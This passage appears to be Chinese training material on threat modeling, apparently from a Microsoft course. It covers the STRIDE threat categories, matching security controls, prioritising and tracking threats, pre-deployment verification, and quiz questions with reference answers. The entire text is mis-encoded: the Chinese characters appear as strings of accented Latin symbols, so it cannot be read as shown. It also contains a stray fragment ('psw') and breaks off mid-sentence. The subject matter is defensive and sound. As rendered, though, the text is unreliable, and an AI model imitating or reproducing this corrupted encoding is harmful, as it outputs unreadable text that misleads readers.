ä¸­æ–­åœ¨ä¸­æ–­é˜¶æ®µï¼Œéœ€ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾æŸ¥æ‰¾é’ˆå¯¹ç³»ç»Ÿçš„æ½œåœ¨å¨èƒã€‚ æ­¤è¿‡ç¨‹ä½¿ç”¨å¨èƒå»ºæ¨¡æ¡†æ¶ï¼Œä»¥å¸®åŠ©ä½ æŸ¥æ‰¾æœ€å¸¸è§çš„å¨èƒå’Œé˜²èŒƒå¨èƒçš„æ–¹æ³•ã€‚ ç›®æ ‡ é€‰æ‹©ä»¥ â€œä¿æŠ¤ç³»ç»Ÿâ€ æˆ– â€œäº†è§£æ”»å‡»è€…â€ ä¸ºæ ¸å¿ƒçš„æ–¹æ³• ï¼ˆå¯å‚è€ƒæ¨¡å—4äº†è§£è¿™ä¸¤ç§æ–¹æ³•ï¼‰ ä½¿ç”¨ STRIDE æ¡†æ¶è¯†åˆ«å¸¸è§å¨èƒï¼ˆSTRIDEå¨èƒæ¨¡å‹å‡ ä¹å¯ä»¥æ¶µç›–ç›®å‰ç»å¤§éƒ¨åˆ†å®‰å…¨é—®é¢˜ï¼‰ï¼Œå³ æ¬ºéª—ï¼ˆSpoofingï¼‰ ç¯¡æ”¹ï¼ˆTamperingï¼‰ å¦è®¤ï¼ˆRepudiationï¼‰ èµ„è®¯æ³„éœ²ï¼ˆInformation disclosureï¼‰ï¼Œå¯èƒ½æ˜¯éšç§æ³„éœ²æˆ–æ˜¯èµ„æ–™å¤–æ³„ é˜»æ–­æœåŠ¡æ”»å‡»ï¼ˆDenial of serviceï¼‰ ç‰¹æƒæå‡ï¼ˆElevation of privilege å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œå°±ä¸ä¼šå‘ç°ç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æœªæ¥å‡ºç°è¿è§„ç°è±¡ã€‚ ç¡®å®šæ–¹æ³•ä¾§é‡ç‚¹é¦–å…ˆï¼Œé€‰æ‹©æ˜¯è¦æ‰¾åˆ°ä¿æŠ¤ç³»ç»Ÿçš„æ–¹æ³•ï¼Œè¿˜æ˜¯æƒ³è¦å°½å¯èƒ½åœ°äº†è§£æ”»å‡»è€…åŠå…¶åŠ¨æœºã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ä¾§é‡ç‚¹ å¯ä»¥æŸ¥æ‰¾çš„å†…å®¹ç¤ºä¾‹ ç³»ç»Ÿ å‘ç°ç”¨æˆ·ä¸ç³»ç»Ÿä¹‹é—´çš„æœªåŠ å¯†è¿æ¥å­˜åœ¨é—®é¢˜ã€‚ æ”»å‡»è€… è¿›ä¸€æ­¥äº†è§£æ–¹æ³•ã€åŠ¨æœºå’Œå¼ºåŒ–ç³»ç»Ÿå…¥å£ç‚¹çš„æ–¹æ³•ã€‚ èµ„äº§ åŸºäºåˆ†ç±»æ•°æ®å¤„ç†ç­‰åŠŸèƒ½ç¡®å®šå…³é”®èµ„äº§ï¼Œä¸»è¦ä¸“æ³¨äºä¿æŠ¤è¿™äº›èµ„äº§ã€‚ Microsoft äº§å“å·¥ç¨‹å¸ˆä¸»è¦è‡´åŠ›äºä¿æŠ¤ç³»ç»Ÿã€‚ æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸¤è€…å…¼é¡¾ã€‚ é€‰æ‹©å¨èƒæ¡†æ¶æ¥ä¸‹æ¥ï¼Œé€‰æ‹©ä¸€ä¸ªæ¡†æ¶ï¼Œå¸®åŠ©ç”Ÿæˆç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒã€‚ Microsoft é€šå¸¸ä½¿ç”¨ STRIDEï¼ˆå…­ä¸ªä¸»è¦å¨èƒç±»åˆ«çš„é¦–å­—æ¯ç¼©å†™ï¼‰æä¾›å¹¿æ³›ä½†ä¸å®Œæ•´çš„å¨èƒåˆ—è¡¨ã€‚ æ­¤æ¡†æ¶å¯å¸®åŠ©ä½ æå‡ºæœ‰å…³ç³»ç»Ÿçš„å‡ ä¸ªé‡è¦é—®é¢˜ï¼š å¨èƒ å®šä¹‰ é—®é¢˜ å¨èƒç¤ºä¾‹ æ¬ºéª— æ”»å‡»è€…å†’å……æŸäººæˆ–æŸç‰© é€šä¿¡çš„åŒæ–¹æ˜¯å¦éƒ½é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Ÿ é€šè¿‡çœ‹ä¼¼åˆæ³•çš„å¸æˆ·å‘ç”¨æˆ·å‘é€ä¸€å°å¸¦æœ‰æ¶æ„é“¾æ¥å’Œé™„ä»¶çš„ç”µå­é‚®ä»¶ï¼Œä»¥æ•è·ç”¨æˆ·çš„å‡­æ®ã€æ•°æ®å’Œè®¾å¤‡è®¿é—®æƒé™ã€‚ ç¯¡æ”¹ æ”»å‡»è€…åœ¨æœªç»æˆæƒçš„æƒ…å†µä¸‹æ›´æ”¹æ•°æ® å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•æ›´æ”¹ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ é€šè¿‡å¼± API è°ƒç”¨å¤„ç†ä¿®æ”¹å†…å­˜ï¼Œå¯¼è‡´å´©æºƒå’Œæ³„æ¼æ•æ„Ÿé”™è¯¯æ¶ˆæ¯ã€‚ å¦è®¤æ€§ æ”»å‡»è€…å£°ç§°å°šæœªæ‰§è¡Œä»»ä½•æ“ä½œ æ¯ä¸ªæ“ä½œæ˜¯å¦å¯ä»¥ç»‘å®šåˆ°æ ‡è¯†ï¼Ÿ å£°ç§°æ²¡æœ‰åˆ é™¤æ•°æ®åº“è®°å½•ã€‚ ä¿¡æ¯æ³„éœ² æ”»å‡»è€…çœ‹åˆ°äº†ä¸åº”çœ‹åˆ°çš„æ•°æ® å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•çœ‹åˆ°ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ è®¿é—®å®‰å…¨æ§åˆ¶è¾ƒå¼±çš„æœªæˆæƒæ–‡æ¡£å’Œæ–‡ä»¶å¤¹ã€‚ æ‹’ç»æœåŠ¡ æ”»å‡»è€…ä½¿ä½ çš„ç³»ç»Ÿå´©æºƒ ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨èµ„æºå—é™çš„åŒºåŸŸï¼Ÿ å‘ç½‘ç»œå‘é€å¤§é‡è¯·æ±‚ã€‚ æƒé™æå‡ æ”»å‡»è€…æœªç»æˆæƒè€Œå¯è®¿é—®æ•°æ® å¦‚ä½•å¾—çŸ¥æŸäººå¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Ÿ åˆ©ç”¨è¾“å…¥å¤„ç†é€»è¾‘æˆ–å†…å­˜ä¸­çš„å¼±ç‚¹æ¥æå–æ•°æ®ã€‚ çŸ¥è¯†æ£€æŸ¥ ä¸­æ–­é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ A. é€šè¿‡ç›¸å…³æ¡†æ¶é€‰æ‹©é‡ç‚¹é¢†åŸŸï¼Œä»¥ç³»ç»Ÿåœ°è¯†åˆ«ç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒã€‚ B. é€šè¿‡ç›¸å…³æ¡†æ¶é€‰æ‹©é‡ç‚¹é¢†åŸŸï¼Œä»¥ç³»ç»Ÿåœ°è¯†åˆ«å¯ä»¥åº”ç”¨åˆ°ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆã€‚ C. å®‰å…¨å›¢é˜Ÿå¼€ä¼šè®¨è®ºï¼Œé€‰æ‹©é‡ç‚¹é¢†åŸŸå’Œç›¸å…³æ¡†æ¶ï¼Œä»¥ç³»ç»Ÿåœ°è¯†åˆ«ç³»ç»Ÿä¸­çš„æ½œåœ¨å¨èƒã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. åœ¨ä½¿ç”¨ STRIDE æŸ¥æ‰¾æ½œåœ¨å¨èƒæ—¶ï¼Œè¯·å…³æ³¨ç³»ç»Ÿæˆ–æ”»å‡»è€…ã€‚B. æ­¤ä»»åŠ¡å±äºé˜¶æ®µ 3 - ä¿®å¤é˜¶æ®µã€‚C. åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥é€‰æ‹©ä¸å®‰å…¨å›¢é˜Ÿå¼€ä¼šè®¨è®ºï¼Œä½†ä¸å¼ºåˆ¶è¦æ±‚è¿™ä¹ˆåšï¼ˆé™¤éç»„ç»‡æœ‰ç›¸å…³è¦æ±‚ï¼‰ã€‚ æ­¥éª¤3 - ä¿®å¤åœ¨ä¿®å¤é˜¶æ®µï¼Œéœ€è¦å†³å®šå¦‚ä½•å¤„ç†æ‰€æœ‰å¨èƒã€‚ æ¯ä¸ª STRIDE å¨èƒéƒ½å¯¹åº”åˆ°ä¸€é¡¹æˆ–å¤šé¡¹å®‰å…¨æ§åˆ¶ï¼Œè¿™äº›æ§åˆ¶æªæ–½æä¾›ä¸åŒçš„åŠŸèƒ½å’Œç±»å‹ä¾›ä½ é€‰æ‹©ã€‚ ç›®æ ‡ æ ¹æ®ä¼˜å…ˆçº§æ¡†æ¶æˆ–å®‰å…¨ bug æ è¡¡é‡æ¯ä¸ªå¨èƒçš„ä¼˜å…ˆçº§ åœ¨ bug ç®¡ç†æœåŠ¡ä¸­å°†æ¯ä¸ªå¨èƒä½œä¸ºä»»åŠ¡æˆ–å·¥ä½œé¡¹è¿›è¡Œè·Ÿè¸ª ç”Ÿæˆå¯¹åº”äº STRIDE å¨èƒçš„å®‰å…¨æ§åˆ¶å»ºè®® é€‰æ‹©ä¸€é¡¹æˆ–å¤šé¡¹å®‰å…¨æ§åˆ¶ç±»å‹å’ŒåŠŸèƒ½æ¥åº”å¯¹æ¯ä¸ªå¨èƒ è§£å†³ä»»åŠ¡ å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œå°±æ‰¾ä¸åˆ°å®‰å…¨æ§åˆ¶æ¥å¸®åŠ©é™ä½é£é™©æˆ–æ­£ç¡®è·Ÿè¸ªæ¯ä¸ªå¨èƒã€‚ è®¾ç½®å¨èƒè·Ÿå¢å·¥ä½œæµç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§é¦–å…ˆï¼Œæ ¹æ®ä¼˜å…ˆçº§æ¡†æ¶æˆ–å®‰å…¨ bug æ æ¥è¡¡é‡æ¯ä¸ªå¨èƒã€‚ æ­¤è¿‡ç¨‹å¯å¸®åŠ©ä½ è®¡åˆ’èµ„æºæ¥è§£å†³å¯¹ç»„ç»‡è€Œè¨€æ›´é‡è¦çš„é—®é¢˜ã€‚ æ­¤è¿‡ç¨‹ä½¿ç”¨ä¸‰ä¸ªå…³é”®å˜é‡ï¼š å˜é‡ è¯´æ˜ å½±å“ ä½¿ç”¨ STRIDE ç±»åˆ«åˆ†é…å½±å“ã€‚ ä¸¥é‡æ€§ ä½¿ç”¨å†…éƒ¨ bug æ æˆ–ä¼˜å…ˆçº§æ¡†æ¶æ¥åˆ†é…æœ€åæƒ…å†µä¸‹çš„ä¸¥é‡æ€§ã€‚ é£é™© å¯¹å®‰å…¨æ§åˆ¶æœ‰æ•ˆæ€§å’Œå®ç°æˆæœ¬è¿›è¡Œè®¡ç®—ã€‚ Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨å†…éƒ¨å®‰å…¨ bug æ ï¼Œä¸ºå¨èƒåˆ†é…â€œä¸¥é‡â€ã€â€œé‡è¦â€ã€â€œä¸­ç­‰â€ã€â€œä½â€æˆ–â€œä¿¡æ¯â€ä¸¥é‡æ€§ç­‰çº§ã€‚ è¯·å’¨è¯¢å®‰å…¨å›¢é˜Ÿï¼Œç¡®è®¤å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ã€‚ åˆ›å»ºä»»åŠ¡æ¥ä¸‹æ¥ï¼Œåœ¨ Azure DevOps Services ç­‰ bug ç®¡ç†è§£å†³æ–¹æ¡ˆä¸­æ·»åŠ æ¯ä¸ªå¨èƒã€‚ éƒ¨åˆ†ä¼˜ç‚¹åŒ…æ‹¬ï¼š è¿›ä¸€æ­¥ç¡®å®šé—®é¢˜è´£ä»»äºº æœ‰æ•ˆè·Ÿè¸ªå†å²è®°å½• è®©ä½ èƒ½å¤Ÿä½¿ç”¨æ ‡å‡†åŒ–æ¨¡æ¿æ¥è¿›è¡Œä¼˜å…ˆçº§å’Œè§£å†³æ–¹æ¡ˆæ¼”ç»ƒ è¯„ä¼°å¨èƒæœ‰æ•ˆæ€§å’Œæˆæœ¬æŸ¥çœ‹å¯¹åº”äº STRIDE å¨èƒçš„æ¯é¡¹å®‰å…¨æ§åˆ¶å»ºè®®ã€‚ è®°ä¸‹æœ€æœ‰æ•ˆå’Œæˆæœ¬æœ€ä½çš„å»ºè®®ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š å¨èƒ å®‰å…¨æ§åˆ¶ å®‰å…¨æ§åˆ¶ç¤ºä¾‹ æ¬ºéª— èº«ä»½éªŒè¯ å‘é€å’Œæ¥æ”¶ä½¿ç”¨æ•°å­—ç­¾åè¿›è¡Œç­¾åçš„æ¶ˆæ¯ï¼Œä»¥éªŒè¯æ¥æºå¹¶ç¡®ä¿æ¶ˆæ¯å®Œæ•´æ€§ã€‚ ç¯¡æ”¹ å®Œæ•´æ€§ éªŒè¯è¾“å…¥ä»¥é˜²æ­¢å¤„ç†æ¶æ„æœ‰æ•ˆè´Ÿè½½å’Œé”™è¯¯å¤„ç†æ„å¤–è¡Œä¸ºã€‚ å¦è®¤æ€§ ä¸å¯å¦è®¤æ€§ åˆ›å»ºå’Œä¿æŠ¤åŒ…å«ç”¨æˆ·æ“ä½œå’Œæ—¶é—´æˆ³çš„å®‰å…¨æ—¥å¿—ã€‚ ä¿¡æ¯æ³„éœ² ä¿å¯†æ€§ åº”ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œä»¥ç¡®ä¿åˆé€‚çš„ç”¨æˆ·å¯ä»¥è®¿é—®é€‚å½“çš„æ•°æ®ã€‚ æ‹’ç»æœåŠ¡ å¯ç”¨æ€§ ä½¿ç”¨å¼¹æ€§èµ„æºç®¡ç†ä¸æ–­å¢åŠ æˆ–å‡å°‘çš„ä½¿ç”¨é‡ã€‚ æƒé™æå‡ æˆæƒ ä½¿ç”¨æœ€å°‘çš„è®¿é—®é‡è¿è¡ŒæœåŠ¡ã€‚ å¯èƒ½æœ‰è¿™æ ·çš„å®‰å…¨æ§åˆ¶ï¼Œå¯ä»¥åŒæ—¶å‡è½»æˆ–å®Œå…¨æ¶ˆé™¤å¤šä¸ªå¨èƒã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ SSL/TLS åˆ›å»ºå®‰å…¨ä¼ è¾“é€šé“ï¼Œä»¥å¸®åŠ©é˜²æ­¢æ¶æ„æ•°æ®ä¿®æ”¹æˆ–æ³„éœ²ã€‚ å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½å®‰å…¨æ§åˆ¶å…·æœ‰ä¸åŒçš„ç±»å‹å’ŒåŠŸèƒ½ã€‚ ç»“åˆä½¿ç”¨æ—¶ï¼Œå®ƒä»¬æœ‰åŠ©äºä¿æŠ¤ç³»ç»Ÿçš„å®‰å…¨ï¼Œå¹¶åˆ›å»ºå¤šä¸ªå®‰å…¨ä¿æŠ¤å±‚ï¼Œä¹Ÿç§°ä¸ºæ·±å±‚é˜²å¾¡ã€‚ ä½ å¯ä»¥é€‰æ‹©ä¸€ç§æˆ–å¤šç§å®‰å…¨æ§åˆ¶ç±»å‹ï¼š ç‰©ç†ç±»å‹ï¼Œå¦‚æ‘„åƒå¤´ æŠ€æœ¯ç±»å‹ï¼Œå¦‚åŠ å¯† ç®¡ç†ç±»å‹ï¼Œå¦‚ç­–ç•¥ å®ƒä»¬å¯èƒ½æœ‰ä¸€é¡¹æˆ–å¤šé¡¹å®‰å…¨æ§åˆ¶åŠŸèƒ½ï¼š å‡½æ•° æè¿° é¢„é˜² é™ä½å¨èƒçš„æ¦‚ç‡æˆ–å½±å“ï¼Œå¦‚é˜²ç«å¢™ã€‚ æ£€æµ‹ è¯†åˆ«å‘ç”Ÿçš„æ”»å‡»ï¼Œå¦‚ç›‘è§†ã€‚ çº æ­£ æ§åˆ¶ç³»ç»Ÿå¦‚ä½•å“åº”å…¶å—åˆ°çš„æ”»å‡»ï¼Œå¦‚ç³»ç»Ÿä¿®è¡¥ç¨‹åºã€‚ æ¢å¤ ä»æ”»å‡»ä¸­æ¢å¤ç³»ç»Ÿï¼Œå¦‚å¤‡ä»½ã€‚ é˜»ç¢ é˜»æ­¢æ”»å‡»è€…è®¿é—®ç³»ç»Ÿï¼Œå¦‚æœ€ä½æƒé™ã€‚ ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ å®‰å…¨æ§åˆ¶è¯¦ç»†ä¿¡æ¯åœ¨ bug ç®¡ç†è§£å†³æ–¹æ¡ˆä¸­ä¸ºæ¯ä¸ªé—®é¢˜æ·»åŠ è¯¦ç»†ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹å…¶ä¸­ä¸€ä¸ªè§£å†³æ–¹æ¡ˆè§£å†³å„ä¸ªé—®é¢˜ã€‚ è¿™åœ¨ä¸åŒç»„ç»‡ä¹‹é—´å­˜åœ¨ç•¥å¾®å·®å¼‚ï¼š è§£å†³æ–¹æ¡ˆ æè¿° å‡è½» å°†é€šè¿‡ Bug ä¿®å¤æˆ–é‡æ–°è®¾è®¡æ¥è§£å†³é—®é¢˜ï¼Œä»¥å‡è½»æˆ–æ¶ˆé™¤å¨èƒå½±å“å’Œä¸¥é‡æ€§ã€‚ è½¬ç§» ç”±å…¶ä»–ç³»ç»Ÿæˆ–å›¢é˜Ÿå¤„ç†é—®é¢˜ã€‚ é¿å… å»é™¤ç³»ç»Ÿä¸­åŒ…å«é—®é¢˜çš„éƒ¨åˆ†ã€‚ æ¥å— æ²¡æœ‰è§£å†³æ–¹æ¡ˆï¼Œå°†æ¥å—é£é™©ã€‚ éœ€è¦ç»æˆæƒçš„é£é™©å†³ç­–è€…çš„æ‰¹å‡†ï¼Œå…¶ä¸­å†³ç­–è€…å¯èƒ½å–å†³äºå¨èƒçš„ä¸¥é‡æ€§ã€‚ ä¸¥é‡å¨èƒå¯èƒ½éœ€è¦é«˜çº§é¢†å¯¼çš„æ‰¹å‡†ï¼Œè€Œæ·±å±‚é˜²å¾¡é£é™©å¯èƒ½éœ€è¦é«˜çº§å·¥ç¨‹å¸ˆæ‰¹å‡†ã€‚ ä¸ä½ çš„å›¢é˜Ÿäº¤æµä»¥è·å¾—æˆ˜ç•¥æŒ‡å¯¼ã€‚ çŸ¥è¯†æ£€æŸ¥ ä¿®å¤é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ A. åœ¨éƒ¨ç½²ç³»ç»Ÿä¹‹å‰éªŒè¯æ‰€æœ‰ä¿®è¡¥ç¨‹åºã€‚ B. åœ¨è¿™ä¸€é˜¶æ®µï¼Œä½ å°†ç”Ÿæˆå¹¶éªŒè¯ä¸€ç³»åˆ—å®‰å…¨æ§åˆ¶ï¼Œå¹¶è®¾ç½®å…¶ä¼˜å…ˆçº§ï¼Œä»¥å‡è½»æˆ–æ¶ˆé™¤é£é™©ã€‚ C. æ­¤æ—¶ï¼Œé€‰æ‹©æ¡†æ¶ä»¥å¸®åŠ©ç”Ÿæˆæ½œåœ¨çš„å¨èƒã€‚ å‚è€ƒç­”æ¡ˆï¼š== B == è§£é‡Šï¼šA. å±äºæ­¥éª¤ 4 - éªŒè¯é˜¶æ®µã€‚B. psw æ¯ä¸ªå¨èƒéƒ½å¯¹åº”åˆ°ä¸€ä¸ªå¯é™ä½æˆ–æ¶ˆé™¤é£é™©çš„å®‰å…¨æ§åˆ¶ã€‚ æ ¹æ®ç»„ç»‡çš„å®‰å…¨é£é™©æƒ¯ä¾‹ï¼Œç¡®å®šè¿™äº›å¨èƒçš„ä¼˜å…ˆçº§å¹¶è¿›è¡Œè·Ÿè¸ªã€‚C. æ­¤ä»»åŠ¡å±äºæ­¥éª¤ 2 - ä¸­æ–­é˜¶æ®µã€‚ æ­¥éª¤4 - éªŒè¯éªŒè¯é˜¶æ®µæ˜¯å¨èƒå»ºæ¨¡è¿‡ç¨‹çš„æœ€åä¸€æ­¥ï¼Œé€šå¸¸å‘ç”Ÿåœ¨éƒ¨ç½²ç³»ç»Ÿä¹‹å‰ã€‚ å®ƒæ¶‰åŠåˆ°ç¡®ä¿æ»¡è¶³è¦æ±‚ã€éªŒè¯å‡è®¾ä»¥åŠå‡†å¤‡å¥½å®‰å…¨æ§åˆ¶ã€‚ ç›®æ ‡ ç¡®è®¤ç³»ç»Ÿæ»¡è¶³æ‰€æœ‰æ–°æ—§å®‰å…¨è¦æ±‚ é…ç½®äº‘æä¾›å•†ã€æ“ä½œç³»ç»Ÿå’Œç»„ä»¶ä»¥æ»¡è¶³å®‰å…¨è¦æ±‚ ç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„å®‰å…¨æ§åˆ¶è§£å†³æ‰€æœ‰é—®é¢˜ åœ¨éƒ¨ç½²å‰å¯¹ç³»ç»Ÿè¿›è¡Œæ‰‹åŠ¨å’Œè‡ªåŠ¨éªŒè¯ å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œå°±æ— æ³•éªŒè¯æ˜¯å¦å·²æˆåŠŸå®Œæˆå®‰å…¨å·¥ä½œã€‚ éªŒè¯è¦æ±‚å’Œè®¾ç½®é»˜è®¤å€¼é¦–å…ˆï¼ŒéªŒè¯æ˜¯å¦æ»¡è¶³ç¬¬ä¸€é˜¶æ®µåˆ›å»ºçš„æ‰€æœ‰è¦æ±‚ã€‚ ç¤ºä¾‹ï¼š ç½‘ç»œå®‰å…¨è®¡åˆ’ æœºå¯†ç®¡ç†è§£å†³æ–¹æ¡ˆå®æ–½ æ—¥å¿—è®°å½•å’Œç›‘è§†ç³»ç»Ÿ æ ‡è¯†å’Œè®¿é—®æ§åˆ¶ ç„¶åï¼Œç¡®ä¿äº‘æä¾›å•†ã€æ“ä½œç³»ç»Ÿå’Œç»„ä»¶çš„é»˜è®¤é…ç½®è®¾ç½®å·²æ›´æ”¹ï¼Œå¯æ»¡è¶³æ‰€æœ‰å®‰å…¨è¦æ±‚ã€‚ ç¤ºä¾‹ï¼š å¯ç”¨ Azure SQL æ•°æ®åº“é€æ˜æ•°æ®åŠ å¯†ä»¥ä¿æŠ¤ç£ç›˜ä¸Šçš„æ•°æ® ä½¿ç”¨åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (RBAC) å‘ç”¨æˆ·ã€ç»„å’Œåº”ç”¨ç¨‹åºåˆ†é…æƒé™ è·¨æ‰€æœ‰é…ç½®æ–‡ä»¶å¯ç”¨ Windows é˜²ç«å¢™ åº”è§£å†³ bug ç®¡ç†è§£å†³æ–¹æ¡ˆä¸­è®°å½•çš„æ‰€æœ‰é—®é¢˜å¹¶éªŒè¯æ‰€æœ‰ä¿®è¡¥ç¨‹åºã€‚ æ‰§è¡ŒéªŒè¯æœ€åä¸€éƒ¨åˆ†æ¶‰åŠè¿è¡Œæ‰‹åŠ¨å’Œè‡ªåŠ¨éªŒè¯ã€‚ åœ¨ Microsoftï¼Œéƒ¨ç½²ç³»ç»Ÿä¹‹å‰å¿…é¡»å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯è¿‡ç¨‹å¯èƒ½åŒ…å«è‡ªåŠ¨æ‰«æç¨‹åºã€ä»£ç è¯„å®¡å’Œæ¸—é€æµ‹è¯•ã€‚ å¯ä»¥åœ¨æ¯æ¬¡éƒ¨ç½²ä¹‹å‰æˆ–éš”ä¸€å®šçš„æ—¶é—´ï¼ˆå¦‚æ¯ 6 - 12 ä¸ªæœˆï¼‰å¼ºåˆ¶æ‰§è¡Œè¯¥è¿‡ç¨‹ã€‚ å¦‚æœä»¥ä¸‹ä»»ä¸€é—®é¢˜çš„ç­”æ¡ˆä¸ºâ€œæ˜¯â€ï¼Œæœ€å¥½è®¾ç½®è¾ƒçŸ­çš„éªŒè¯å‘¨æœŸï¼š æˆ‘çš„ç³»ç»Ÿä¼šåœ¨éƒ¨ä½¿ç”¨å—ï¼Ÿ å®ƒå¯ä»¥å¤„ç†æœºå¯†æ•°æ®å—ï¼Ÿ æˆ‘å¿…é¡»éµå®ˆæŸäº›è§„å®šå—ï¼Ÿ æˆ‘çš„ç»„ç»‡æ˜¯å¦è¦æ±‚å®æ–½å…¶ä»–å®‰å…¨ä¿æŠ¤è¿‡ç¨‹ï¼Œä»¥åº”å¯¹éšç§å½±å“ã€è¿è¥é£é™©æˆ–å¼€å‘è¦æ±‚ï¼Ÿ çŸ¥è¯†æ£€æŸ¥ éªŒè¯é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ A. å®æ–½ä¸€ç³»åˆ—é€‚ç”¨çš„å®‰å…¨æ§åˆ¶ï¼Œä»¥å‡è½»æˆ–æ¶ˆé™¤é£é™©ã€‚ B. åœ¨å°†ä»£ç æ¨é€åˆ°æš‚å­˜åˆ†æ”¯è¿›è¡Œéƒ¨ç½²ä¹‹å‰ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œæ‰‹åŠ¨æ£€æŸ¥ã€‚ C. é’ˆå¯¹å…ˆå‰äº§ç”Ÿçš„å¨èƒæ‰‹åŠ¨æˆ–è‡ªåŠ¨éªŒè¯ç³»ç»Ÿï¼Œä»¥éªŒè¯å®‰å…¨æ§åˆ¶æ˜¯å¦é™ä½æˆ–æ¶ˆé™¤äº†é£é™©ã€‚ å‚è€ƒç­”æ¡ˆï¼š== C == è§£é‡Šï¼šA. æ­¤ä»»åŠ¡å±äºæ­¥éª¤ 3 - ä¿®å¤é˜¶æ®µã€‚B. æ­¤ç­”æ¡ˆæ›´é€‚ç”¨äºæ“ä½œæ–¹é¢ï¼Œè€Œä¸æ˜¯å¨èƒå»ºæ¨¡è¿‡ç¨‹ã€‚C. æ­¤é˜¶æ®µçš„ä¸»è¦å·¥ä½œæ˜¯éªŒè¯ä¿®å¤ã€å‡è®¾å’Œæ»¡è¶³è¦æ±‚ã€‚ å°ç»“æ‘˜è¦å¨èƒå»ºæ¨¡æ˜¯å¸®åŠ©ä¿æŠ¤ç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€ç½‘ç»œå’ŒæœåŠ¡çš„æœ‰æ•ˆæ–¹æ³•ã€‚ å®ƒå¯ä»¥è¯†åˆ«æ½œåœ¨çš„å¨èƒå¹¶æ¨èé£é™©é™ä½ç­–ç•¥ï¼Œä»¥å¸®åŠ©ä½ åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸå®ç°å®‰å…¨ç›®æ ‡ã€‚ æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š äº†è§£æ˜ç¡®è¦æ±‚å’Œå‡è®¾ä»¥å¸®åŠ©åˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„é‡è¦æ€§ äº†è§£å¯å¸®åŠ©ä½ æŸ¥æ‰¾ç³»ç»Ÿä¸­å®‰å…¨é—®é¢˜çš„æ¡†æ¶ äº†è§£æœ‰åŠ©äºå‡è½»æˆ–æ¶ˆé™¤æ½œåœ¨å¨èƒçš„å®‰å…¨æ§åˆ¶ç±»åˆ« é‡ç‚¹ä»‹ç»åœ¨éƒ¨ç½²ä¹‹å‰éªŒè¯å‡è®¾ã€è¦æ±‚å’Œä¿®å¤çš„é‡è¦æ€§ åç»­æ­¥éª¤åœ¨æ­¤å­¦ä¹ è·¯å¾„çš„åç»­å‡ ä¸ªæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£åœ¨å››ä¸ªé˜¶æ®µå¼•å…¥çš„æ¯ä¸ªæ¦‚å¿µï¼Œå¹¶è¿›è¡Œè¯¦ç»†è®¨è®ºï¼š æ¨¡å— æ ‡é¢˜ è¯´æ˜ 2 ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹ äº†è§£æ•°æ®æµå…³ç³»å›¾ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ŒåŒ…æ‹¬ä½•æ—¶ä½¿ç”¨å®ƒä»¬ä»¥åŠè¦åŒ…å«çš„ä¸Šä¸‹æ–‡ã€‚ 3 æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡ åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰ï¼Œäº†è§£æ¯ä¸ªä¸Šä¸‹æ–‡å±‚æ¬¡çš„å·®å¼‚å’Œé€‚ç”¨æƒ…å½¢ã€‚ 4 å¤„ç†æ•°æ®æµå…³ç³»å›¾æ—¶å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹ äº†è§£å…³æ³¨å¨èƒå»ºæ¨¡æ´»åŠ¨çš„ä¸åŒæ–¹æ³•ã€‚ 5 ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³• æ·±å…¥ç ”ç©¶ 